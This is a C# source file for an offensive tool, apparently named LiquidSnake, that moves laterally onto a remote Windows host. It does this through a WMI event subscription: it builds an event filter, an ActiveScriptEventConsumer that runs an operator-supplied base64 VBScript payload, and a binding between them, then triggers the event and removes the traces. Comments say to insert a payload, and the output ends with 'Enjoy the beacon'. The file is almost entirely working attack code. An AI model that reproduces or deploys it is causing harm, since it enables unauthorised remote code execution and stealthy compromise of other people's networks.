using System;
using System.Text;
using System.Collections;
using System.Collections.Generic;
using System.Management;
using System.Security.Cryptography.X509Certificates;

namespace LiquidSnake
{
    class Program
    {

        static void Main(string[] args)
        {
            MoveWMI(args);
        }

        static void MoveWMI(string[] args)
        {
            ManagementObject myEventFilter = null;
            ManagementObject myEventConsumer = null;
            ManagementObject myBinder = null;

            if (args.Length >= 2)
            {
                helpmenu();
                return;
            }
            else if (args.Length == 0)
            {
                Console.WriteLine("[-] Usage: -h for help or wmimove.exe <host> ");
                return;
            }
            else if (args[0] == "-h")
            {
                helpmenu();
                return;
            }

            void helpmenu()
            {
                Console.WriteLine("[-] Help menu:");
                Console.WriteLine("[-] Usage: wmimove.exe <host> ");
                Console.WriteLine("[-] Example: wmimove -M -I -E -- dc01.sliver.corp");
                return;
            }
            // Inset your dll/.net payload which has ben converted to VBS, Into the var below //
            string vbscript64 = "";
            string vbscript = Encoding.UTF8.GetString(Convert.FromBase64String(vbscript64));
            try
            {
                string NAMESPACE = "\\\\" + args[0] + "\\root\\subscription";



                ConnectionOptions cOption = new ConnectionOptions();
                ManagementScope scope = null;
                scope = new ManagementScope(NAMESPACE, cOption);


                scope.Options.EnablePrivileges = true;
                scope.Options.Authentication = AuthenticationLevel.PacketPrivacy;
                scope.Options.Impersonation = ImpersonationLevel.Impersonate;


                ManagementClass wmiEventFilter = new ManagementClass(scope, new
                ManagementPath("__EventFilter"), null);
                String strQuery = @"SELECT * FROM __InstanceCreationEvent Within 5 Where TargetInstance Isa 'Win32_LogonSession'";

                WqlEventQuery myEventQuery = new WqlEventQuery(strQuery);
                myEventFilter = wmiEventFilter.CreateInstance();
                myEventFilter["Name"] = "EventFilter";
                myEventFilter["Query"] = myEventQuery.QueryString;
                myEventFilter["QueryLanguage"] = myEventQuery.QueryLanguage;
                myEventFilter["EventNameSpace"] = @"\root\cimv2";
                myEventFilter.Put();
                Console.WriteLine("[*] Event filter created.");

                myEventConsumer =
                new ManagementClass(scope, new ManagementPath("ActiveScriptEventConsumer"),
                null).CreateInstance();
                myEventConsumer["Name"] = "ScriptEventConsumer";
                myEventConsumer["ScriptingEngine"] = "VBScript";
                myEventConsumer["ScriptText"] = vbscript;
                myEventConsumer.Put();

                Console.WriteLine("[*] Event consumer created.");

                myBinder =
                new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"),
                null).CreateInstance();
                myBinder["Filter"] = myEventFilter.Path.RelativePath;
                myBinder["Consumer"] = myEventConsumer.Path.RelativePath;
                myBinder.Put();

                Console.WriteLine("[*] Subscription created, now sleeping");

                System.Threading.Thread.Sleep(10000);

                Console.WriteLine("[*] Trying to proc the event...");

                try
                {
                    // Create a new scope to auth to the target and trigger the even
                    ManagementScope wmiScope = new ManagementScope(NAMESPACE);
                    wmiScope.Options.EnablePrivileges = true;
                    wmiScope.Options.Authentication = AuthenticationLevel.PacketPrivacy;
                    wmiScope.Options.Impersonation = ImpersonationLevel.Impersonate;

                    // Qeuery to send
                    ObjectQuery osQuery = new ObjectQuery("SELECT * FROM Win32_OperatingSystem");

                    // Pull the info
                    ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmiScope, osQuery);

                    // Execute the query and get the collection of results.
                    ManagementObjectCollection osCollection = searcher.Get();

                }
                catch (Exception ex)
                {
                    Console.WriteLine("[*] Error: " + ex.Message);
                }

                Console.WriteLine("[*] Sleeping for 20 seconds then clearing up....");
                System.Threading.Thread.Sleep(20000);


                myEventFilter.Delete();
                myEventConsumer.Delete();
                myBinder.Delete();

                Console.WriteLine("[*] Enjoy the beacon");


            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }

        }
    }
}